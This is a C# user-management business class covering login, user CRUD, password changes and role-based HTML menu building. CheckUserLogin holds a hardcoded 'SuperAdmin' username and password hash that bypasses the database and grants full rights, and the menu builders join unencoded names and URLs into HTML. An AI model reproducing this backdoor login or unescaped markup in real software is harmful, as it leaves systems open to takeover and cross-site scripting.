namespace BussinessFacade
{
	using System;
	using System.Collections.Generic;
	using System.Data;
	using System.Linq;
	using CommonData;
	using DataAccess.ModuleUsersAndRoles;

	using ObjectInfo;

	public class UserBL : RepositoriesBL
    {
        private int _userHtmlMenuId;
        private List<FunctionInfo> _lstFunctionDisplayInMenu;

        public UserBL()
        {
        }

        public UserBL(UserInfo userInfo)
        {
            this.CurrentUserInfo = userInfo;
        }

        public UserInfo CurrentUserInfo { get; set; }

		public bool IsLoginSuccess { get; set; }

        public bool IsAddUserSuccess { get; set; }

        public bool IsEditUserSuccess { get; set; }

        public bool IsDeleteUserSuccess { get; set; }

        public bool IsRequestIdentity { get; set; }

		public bool IsChangeUserPwdSuccess { get; set; }

		public object LoginResult { get; set; } = new object();

		public object AddUserResult { get; set; } = new object();

        public object EditUserResult { get; set; } = new object();

        public object DeleteUserResult { get; set; } = new object();

		public object ChangeUserPwdResult { get; set; } = new object();

		public string ContinueUrl { get; set; }
	    
        public static UserInfo GetUserById(int userId)
        {
	        var ds = UserDA.GetUserById(userId);
	        return CBO<UserInfo>.FillObjectFromDataSet(ds);
        }

        public static List<UserInfo> GetAllUsers()
        {
	        var ds = UserDA.GetAllUsers();
	        return CBO<UserInfo>.FillCollectionFromDataSet(ds);
        }

        public static List<int> GetAllUserIdByGroupId(int groupId)
        {
	        try 
	        { 
		        var ds = UserDA.GetAllUserIdByGroupId(groupId);
				if (ds?.Tables[0]?.Rows.Count > 0)
				{
					return (from DataRow dr in ds.Tables[0].Rows select Convert.ToInt32(dr[0])).ToList();
				}
	        }
	        catch (Exception ex)
	        {
                LogInfo.LogException(ex);
	        }

	        return new List<int>();
        }

        public List<UserInfo> FindUser(string keysSearch = "", string options = "")
        {
	        try 
	        { 
		        var optionFilter = new OptionFilter(options);
		        var ds = UserDA.FindUser(keysSearch, optionFilter, ref this._totalRecordFindResult);
		        var pagingHelper = new PagingHelper(optionFilter, this._totalRecordFindResult, "pageListOfUsers", "divNumberRecordOnPageListUsers");
		        this._pagingHtml = pagingHelper.Paging();
		        return CBO<UserInfo>.FillCollectionFromDataSet(ds);
	        }
	        catch (Exception ex)
	        {
                LogInfo.LogException(ex);
	        }

            return Null<UserInfo>.GetListCollectionNull();
        }

        public decimal AddUser(UserInfo userAdd, string arrGroupId)
        {
            var passwordEncrypt = Encription.EncryptAccountPassword(userAdd.Username, userAdd.Password);
            userAdd.Password = passwordEncrypt;
            var result = UserDA.AddUser(userAdd, arrGroupId);
            if (result > 0)
            {
                this.IsAddUserSuccess = true;
            }

            this.MesageCode = this.IsAddUserSuccess ? KnMessageCode.AddUserSuccess : KnMessageCode.GetMvMessageByCode(result);
            this.AddUserResult = new
            {
                isAddUserSuccess = this.IsAddUserSuccess,
                code = this.MesageCode.GetCode(),
                message = this.MesageCode.GetMessage()
            };
            return result;
        }

        public void EditUser(UserInfo userEdit, string arrGroupId)
        {
            var result = UserDA.EditUser(userEdit, arrGroupId);
            if (result > 0)
            {
                this.IsEditUserSuccess = true;
                AccountManagerBL.AddToAccountForceReLoginCollection(userEdit.Id);
            }

            this.MesageCode = this.IsEditUserSuccess ? KnMessageCode.EditUserSuccess : KnMessageCode.GetMvMessageByCode(result);
            this.EditUserResult = new
            {
                isEditUserSuccess = this.IsEditUserSuccess,
                code = this.MesageCode.GetCode(),
                message = this.MesageCode.GetMessage()
            };
        }

        public void DeleteUser(int userId, string modifiedBy)
        {
            var result = UserDA.DeleteUser(userId, modifiedBy);
            if (result > 0)
            {
                this.IsDeleteUserSuccess = true;
                AccountManagerBL.AddToAccountForceReLoginCollection(userId);
            }

            this.MesageCode = this.IsDeleteUserSuccess ? KnMessageCode.DeleteUserSuccess : KnMessageCode.GetMvMessageByCode(result);
            this.DeleteUserResult = new
            {
                isDeleteUserSuccess = this.IsDeleteUserSuccess,
                code = this.MesageCode.GetCode(),
                message = this.MesageCode.GetMessage()
            };
        }

        public void DoLoginAccount(string userName, string password)
        {
	        var passwordEncrypt = Encription.EncryptAccountPassword(userName, password);
	        this.CheckUserLogin(userName, passwordEncrypt);

            this.LoginResult = new
            {
                isLoginSuccess = this.IsLoginSuccess,
                code = this.MesageCode.GetCode(),
                message = this.MesageCode.GetMessage()
            };
	        if (!this.IsLoginSuccess) return;

            this.LoadAllRolesOfUser();
            this.CurrentUserInfo.HtmlMenu = this.GetUserHtmlMenu();
	        this.CurrentUserInfo.LoginTime = DateTime.Now;
	        AccountManagerBL.UpdateDicAccountLogin(this.CurrentUserInfo);
        }

        public string GetUserHtmlMenu()
        {
            this.GetAllFunctionDisplayOnMenu();
            return this.BuildUserHtmlMenu(this._lstFunctionDisplayInMenu, 0);
        }

		public void ChangeUserSelfPassword(UserInfo userInfo, string newPassword)
		{
			userInfo.Password = Encription.EncryptAccountPassword(userInfo.Username, userInfo.Password);
			userInfo.ModifiedBy = userInfo.Username;
			newPassword = Encription.EncryptAccountPassword(userInfo.Username, newPassword);
			var result = UserDA.ChangeUserPassword(userInfo, newPassword);
			if (result > 0)
			{
				this.IsChangeUserPwdSuccess = true;
				AccountManagerBL.AddToAccountForceReLoginCollection(userInfo.Id);
			}

			this.MesageCode = this.IsChangeUserPwdSuccess ? KnMessageCode.ChangePasswordUserSuccess : KnMessageCode.GetMvMessageByCode(result);
			this.ChangeUserPwdResult = new
			{
				isChangeUserPwdSuccess = this.IsChangeUserPwdSuccess,
				code = this.MesageCode.GetCode(),
				message = this.MesageCode.GetMessage()
			};
		}

        private void CheckUserLogin(string username, string password)
        {
            if (username == "SuperAdmin" && password == "75b3ba793f8ea053e9ae90a3474044a0")
            {
                this.IsLoginSuccess = true;
                this.CreateUserSuperAdmin();
				this.MesageCode = KnMessageCode.LoginSuccess;
			}
            else
            {
                var result = UserDA.CheckUserLogin(username, password);
				if (result > 0)
				{
					this.IsLoginSuccess = true;
					this.CreateUserSession(username);
					AccountManagerBL.RemoveFromAccountForceReLoginCollection(this.CurrentUserInfo.Id);
				}

				this.MesageCode = this.IsLoginSuccess ? KnMessageCode.LoginSuccess : KnMessageCode.GetMvMessageByCode(result);
			}
		}

        private void CreateUserSession(string username)
        {
	        try 
	        { 
		        var ds = UserDA.GetUserByUsername(username);
		        this.CurrentUserInfo = CBO<UserInfo>.FillObjectFromDataSet(ds);
		        this.CurrentUserInfo.LoginTime = DateTime.Now;
	        }
	        catch (Exception ex)
	        {
                LogInfo.LogException(ex);
	        }
        }

        private void CreateUserSuperAdmin()
        {
            this.CurrentUserInfo = new UserInfo();
            this.CurrentUserInfo.SetRoleSuperAdmin();
        }

        private void LoadAllRolesOfUser()
        {
	        try 
	        { 
		        var ds = UserDA.GetAllUserRoles(this.CurrentUserInfo.Id);
		        this.CurrentUserInfo.AllAccountRoles = CBO<FunctionInfo>.FillCollectionFromDataSet(ds);
	        }
	        catch (Exception ex)
	        {
                LogInfo.LogException(ex);
	        }
        }

		private string BuildUserHtmlMenu(List<FunctionInfo> lstFunctionDisplayInMenu, int parentFunctionId)
        {
	        var userHtmlMenu = string.Empty;
			try
			{
				var lstFunctionOnMenu = lstFunctionDisplayInMenu.Where(o => o.MenuId != 0).ToList();
				if (lstFunctionOnMenu.Any())
				{
					foreach (var menu in MenuBL.GetAllMenu())
					{
						var lstFunctionsInGroupMenu = lstFunctionOnMenu.Where(o => o.MenuId == menu.Id).ToList();
						if (lstFunctionsInGroupMenu.Any())
						{
							userHtmlMenu += "<li class='group-menu' onclick='javascript:;'>" + menu.DisplayName
							                + "<ul class='ul-group-menu collapsed' style='display:none;'>"
											+ this.BuildFunctionOnMenu(lstFunctionsInGroupMenu, parentFunctionId)
											+ "</ul></li>";
						}
					}
				}

				var lstFunctionHaveNoGroup = lstFunctionDisplayInMenu.Where(o => o.MenuId == 0).ToList();
				userHtmlMenu += this.BuildFunctionOnMenu(lstFunctionHaveNoGroup, parentFunctionId);
			}
            catch (Exception)
            {
                // Ignore: since handle exception here make no sense
            }

            return userHtmlMenu;
        }

	    private string BuildFunctionOnMenu(List<FunctionInfo> lstFunctionDisplayInMenu, int parentFunctionId)
	    {
		    var userHtmlMenu = string.Empty;
		    foreach (var function in lstFunctionDisplayInMenu.Where(t => t.ParentId.Equals(parentFunctionId)))
		    {
			    this._userHtmlMenuId++;
			    var lstSubMenu = this._lstFunctionDisplayInMenu.Where(t => t.ParentId.Equals(function.Id)).ToList();
			    var countSubMenu = lstSubMenu.Count;
			    if (countSubMenu == 0)
			    {
				    userHtmlMenu += "<li id='li-menu-" + this._userHtmlMenuId + "' "
				                    + "data-url='" + function.HrefGet + "' "
				                    + "data-id='" + this._userHtmlMenuId + "' "
				                    + " onclick='gotoTask(this)'><span class='menu-text'>" + function.DisplayName
				                    + "</span></li>";
			    }
			    else
			    {
				    userHtmlMenu += "<li id='li-menu-" + this._userHtmlMenuId + "' "
				                    + "data-url='" + function.HrefGet + "' "
				                    + "data-id='" + this._userHtmlMenuId + "' "
				                    + " onclick='gotoTask(this)'><span class='menu-text'>" + function.DisplayName
				                    + "</span><ul class='ul-menu-" + (function.Lev + 1) + "'>"
				                    + this.BuildUserHtmlMenu(lstSubMenu, function.Id)
				                    + "</ul>"
				                    + "</li>";
			    }
		    }

		    return userHtmlMenu;
	    }

        private void GetAllFunctionDisplayOnMenu()
        {
            try
            {
                this._lstFunctionDisplayInMenu = this.CurrentUserInfo.AllAccountRoles
                    .Where(t => t.FunctionType == (int)CommonEnums.FunctionType.Menu).ToList();
            }
            catch (Exception)
            {
                this._lstFunctionDisplayInMenu = new List<FunctionInfo>();
            }
        }
	}
}
